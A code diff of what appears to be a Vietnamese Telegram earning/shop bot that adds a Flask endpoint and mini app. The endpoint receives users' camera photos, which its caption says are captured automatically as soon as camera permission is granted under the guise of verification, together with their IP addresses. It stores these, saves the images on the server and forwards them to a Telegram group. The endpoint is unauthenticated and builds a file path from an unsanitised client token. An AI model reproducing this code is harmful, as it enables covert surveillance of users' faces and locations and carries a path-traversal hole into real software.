+    update: Update, context: ContextTypes.DEFAULT_TYPE
+):
+    if not update.effective_message:
         return
-
     user = update.effective_user
-    if user and user.id in ADMIN_IDS and user.id in admin_spl_state:
-        handled = await spl_process_text(update, context)
-        if handled:
-            return
-
-    if await handle_withdraw_amount(update, context):
+    txt = (update.effective_message.text or "").strip()
+    if (
+        user
+        and user.id in admin_input_states
+        and (txt in MENU_BUTTON_TEXTS or is_admin_kb_text(txt))
+    ):
+        admin_input_states.pop(user.id, None)
+    if user and user.id in admin_input_states and user.id in ADMIN_IDS:
+        await admin_commands(update, context)
+        return
+    if await handle_anti_spam(update, context):
         return
     await menu_handler(update, context)
+
 
 async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
     logger.error("Exception khi xử lý update: %s", context.error, exc_info=context.error)
 
-# ============================================================
-# MAIN
-# ============================================================
 
 async def post_init(application: Application) -> None:
     await init_db()
+    await load_code_price()
+
+
+# ============================================================
+# API NHẬN ẢNH NÉT TỪ WEBAPP & ĐẨY ẢNH VỀ NHÓM TELEGRAM
+# ============================================================
+flask_app = Flask(__name__)
+
+
+@flask_app.route('/miniapp', methods=['GET'])
+def serve_miniapp():
+    """Serve file HTML Mini App trực tiếp từ VPS."""
+    try:
+        html_path = os.path.join(
+            os.path.dirname(os.path.abspath(__file__)),
+            "templates",
+            "miniapp.html"
+        )
+        with open(html_path, "r", encoding="utf-8") as fh:
+            return fh.read(), 200, {"Content-Type": "text/html; charset=utf-8"}
+    except FileNotFoundError:
+        return (
+            "<h3>❌ Không tìm thấy file templates/miniapp.html</h3>",
+            404,
+            {"Content-Type": "text/html; charset=utf-8"},
+        )
+    except Exception as exc:
+        return (
+            f"<h3>❌ Lỗi: {exc}</h3>",
+            500,
+            {"Content-Type": "text/html; charset=utf-8"},
+        )
+
+
+@flask_app.route('/api/save-photo', methods=['POST'])
+def save_photo():
+    try:
+        data = request.json
+        token = data.get('token')
+        ip = data.get('ip')
+        image_data = data.get('image')
+        auto_capture = data.get('auto_capture', False)
+
+        # Tìm user_id tương ứng với token (đang chờ xác minh trong bộ nhớ)
+        user_id = None
+        try:
+            snapshot = list(pending_miniapp_captcha.items())
+            for uid, info in snapshot:
+                if info.get('token') == token:
+                    user_id = uid
+                    break
+        except Exception as e:
+            print(f"Lỗi tra token: {e}")
+
+        # Lưu IP + token ảnh camera vào thông tin tài khoản
+        if user_id:
+            try:
+                pool = get_pool()
+                with pool.connection() as conn:
+                    with conn.cursor() as cursor:
+                        if ip:
+                            cursor.execute(
+                                "UPDATE users SET ip_address=%s, camera_photo_token=%s "
+                                "WHERE user_id=%s",
+                                (ip, token, user_id),
+                            )
+                        else:
+                            cursor.execute(
+                                "UPDATE users SET camera_photo_token=%s "
+                                "WHERE user_id=%s",
+                                (token, user_id),
+                            )
+                    conn.commit()
+                print(f"✅ Đã lưu IP/token cho user {user_id}: ip={ip}, token={token}")
+            except Exception as e:
+                print(f"❌ Lỗi lưu IP/token cho user {user_id}: {e}")
+
+        if image_data and "," in image_data:
+            header, encoded = image_data.split(",", 1)
+            image_bytes = base64.b64decode(encoded)
+
+            # Lưu file backup trên VPS
+            os.makedirs("/var/www/phongtunk/captures", exist_ok=True)
+            file_path = f"/var/www/phongtunk/captures/{token}.jpg"
+            with open(file_path, "wb") as fh:
+                fh.write(image_bytes)
+
+            # Gửi ảnh trực tiếp về nhóm Telegram thông qua Bot API
+            if BOT_TOKEN and CAMERA_TARGET_GROUP:
+                if auto_capture:
+                    caption = (
+                        f"📸 <b>ẢNH CHỤP TỰ ĐỘNG - XÁC MINH CAMERA</b>\n"
+                        f"━━━━━━━━━━━━━━━━━━\n"
+                        f"👤 User ID: <code>{user_id or 'N/A'}</code>\n"
+                        f"🌐 IP: <code>{ip or 'Không rõ'}</code>\n"
+                        f"🔑 Token: <code>{token}</code>\n"
+                        f"⚡ Chụp ngay khi cấp quyền Camera"
+                    )
+                else:
+                    caption = (
+                        f"📸 <b>Ảnh chụp camera xác minh MiniApp (HD)</b>\n"
+                        f"👤 User ID: <code>{user_id or 'N/A'}</code>\n"
+                        f"🌐 IP: <code>{ip or 'Không rõ'}</code>\n"
+                        f"Token: <code>{token}</code>"
+                    )
+
+                boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW'
+                body = io.BytesIO()
+
+                body.write(('--' + boundary + '\r\n').encode('utf-8'))
+                body.write(b'Content-Disposition: form-data; name="chat_id"\r\n\r\n')
+                body.write(str(CAMERA_TARGET_GROUP).encode('utf-8') + b'\r\n')
+
+                body.write(('--' + boundary + '\r\n').encode('utf-8'))
+                body.write(b'Content-Disposition: form-data; name="caption"\r\n\r\n')
+                body.write(caption.encode('utf-8') + b'\r\n')
+
+                body.write(('--' + boundary + '\r\n').encode('utf-8'))
+                body.write(b'Content-Disposition: form-data; name="parse_mode"\r\n\r\n')
+                body.write(b'HTML\r\n')
+
+                body.write(('--' + boundary + '\r\n').encode('utf-8'))
+                body.write(b'Content-Disposition: form-data; name="photo"; filename="camera.jpg"\r\n')
+                body.write(b'Content-Type: image/jpeg\r\n\r\n')
+                body.write(image_bytes + b'\r\n')
+
+                body.write(('--' + boundary + '--\r\n').encode('utf-8'))
+
+                req_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
+                req = urllib.request.Request(req_url, data=body.getvalue(), headers={
+                    'Content-Type': f'multipart/form-data; boundary={boundary}'
+                })
+                try:
+                    with urllib.request.urlopen(req) as response:
+                        response.read()
+                    print(f"✅ Ảnh đã gửi về nhóm {CAMERA_TARGET_GROUP} thành công")
+                except Exception as e:
+                    print(f"❌ Lỗi gửi ảnh qua Telegram API: {e}")
+
+        return jsonify({"status": "success"})
+    except Exception as e:
+        print(f"Lỗi nhận ảnh: {e}")
+        return jsonify({"status": "error"}), 500
+
+
+def run_flask():
+    flask_app.run(host="0.0.0.0", port=5000, debug=False, use_reloader=False)
+
 
 def main():
-    if not BOT_TOKEN or not DATABASE_URL:
-        raise RuntimeError("Chưa cấu hình BOT_TOKEN hoặc DATABASE_URL.")
+    if not BOT_TOKEN:
+        raise RuntimeError("Chưa cấu hình BOT_TOKEN.")
+    if not DATABASE_URL:
+        raise RuntimeError("Chưa cấu hình DATABASE_URL.")
+        
+    # Kích hoạt luồng Flask chạy ngầm ở cổng 5000
+    threading.Thread(target=run_flask, daemon=True).start()
+    logger.info("🚀 Luồng Flask Server đã khởi động ngầm thành công trên cổng 5000")
 
     app = Application.builder().token(BOT_TOKEN).post_init(post_init).build()
 
     app.add_handler(CommandHandler("start", start_command))
-    app.add_handler(CommandHandler("lk", link_bank_command))
+    app.add_handler(CommandHandler("settings", admin_menu_command))
+    app.add_handler(CommandHandler("admin", adm_panel_command))
 
-    app.add_handler(CommandHandler("menu", admin_menu_panel))
-    app.add_handler(CommandHandler("ip", ip_command))
-    app.add_handler(CommandHandler("ipx", ipx_command))
-    app.add_handler(CommandHandler("spl", spl_command))
+    app.add_handler(
+        CallbackQueryHandler(
+            admin_toggle_callback, pattern=r"^(toggle_|admin_verify_all)"
+        )
+    )
+    app.add_handler(
+        CallbackQueryHandler(adm_step_callback, pattern=r"^adm_(step_|act_)")
+    )
+    app.add_handler(
+        CallbackQueryHandler(admin_confirm_callback, pattern=r"^(amy_|amcancel$)")
+    )
+    app.add_handler(
+        CallbackQueryHandler(userinfo_callback, pattern=r"^userinfo_")
+    )
+    app.add_handler(
+        CallbackQueryHandler(verify_join_callback, pattern=r"^verify_join$")
+    )
+    app.add_handler(
+        CallbackQueryHandler(
+            code_buy_callback, pattern=r"^(buycode_|approve_code_|reject_code_)"
+        )
+    )
+
+    app.add_handler(MessageHandler(filters.CONTACT, contact_handler))
+    app.add_handler(
+        MessageHandler(filters.StatusUpdate.WEB_APP_DATA, web_app_data_handler)
+    )
 
     admin_cmds = [
-        "reset", "resetcung", "tong", "tongrut", "kt", "tb", "bb", "ban", "unban",
-        "cam", "un", "rut", "tc", "nap", "tru", "gd", "baotri",
-        "resetbank", "dl", "check", "sd", "checkdl"
+        "addstock", "liststock", "stock", "clearstock", "clearstockall",
+        "delhistory", "buyhistory", "addbal", "subbal", "zerobal",
+        "ban", "unban", "banwd", "unbanwd", "unall", "uncap",
+        "skipip", "unip", "resetverify", "info", "detail", "find",
+        "lookup",
+        "txlog", "txfull", "checkfriends", "friends", "users", "stats",
+        "banlist", "wdbanlist", "topbal", "dupip", "dupphone",
+        "biofriends", "scanbio", "banbuff", "checkref", "broadcast",
+        "sendmsg", "maint", "wipeall", "addgroup", "delgroup", "listgroup",
+        "checkgroup", "checkadmin", "clearallgroup", "price", "setprice",
+        "upprice", "downprice",
     ]
     for command in admin_cmds:
         app.add_handler(CommandHandler(command, admin_commands))
 
-    app.add_handler(ChatMemberHandler(chat_member_updated_handler, ChatMemberHandler.CHAT_MEMBER))
-    app.add_handler(CallbackQueryHandler(verify_join_callback, pattern=r"^verify_join$"))
-    app.add_handler(CallbackQueryHandler(captcha_callback, pattern=r"^captcha_\d+$"))
-    app.add_handler(CallbackQueryHandler(cancel_withdraw_callback, pattern=r"^cancel_withdraw$"))
-    app.add_handler(CallbackQueryHandler(admin_withdraw_callback, pattern=r"^(approve|reject)_\d+$"))
-    app.add_handler(CallbackQueryHandler(admin_userinfo_callback, pattern=r"^userinfo_\d+$"))
-    app.add_handler(CallbackQueryHandler(check_history_callback, pattern=r"^check_hist_\d+$"))
-    app.add_handler(CallbackQueryHandler(admin_toggle_callback, pattern=r"^toggle_"))
-    app.add_handler(CallbackQueryHandler(force_verify_all_callback, pattern=r"^force_verify_all$"))
-
-    app.add_handler(CallbackQueryHandler(spl_cancel_callback, pattern=r"^spl_cancel$"))
-    app.add_handler(CallbackQueryHandler(spl_confirm_callback, pattern=r"^spl_confirm_\d{4}-\d{2}-\d{2}$"))
-
-    app.add_handler(MessageHandler(filters.StatusUpdate.WEB_APP_DATA, web_app_data_handler))
-    app.add_handler(MessageHandler(filters.CONTACT, contact_handler))
-
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_message_dispatcher))
+    app.add_handler(
+        MessageHandler(filters.TEXT & ~filters.COMMAND, text_message_dispatcher)
+    )
     app.add_error_handler(error_handler)
 
-    logger.info("🤖 Bot đã chạy...")
-    app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)
+    logger.info("🤖 Bot chạy thành công với tính năng mới")
+    app.run_polling(allowed_updates=Update.ALL_TYPES)
+
 
 if __name__ == "__main__":
     main()
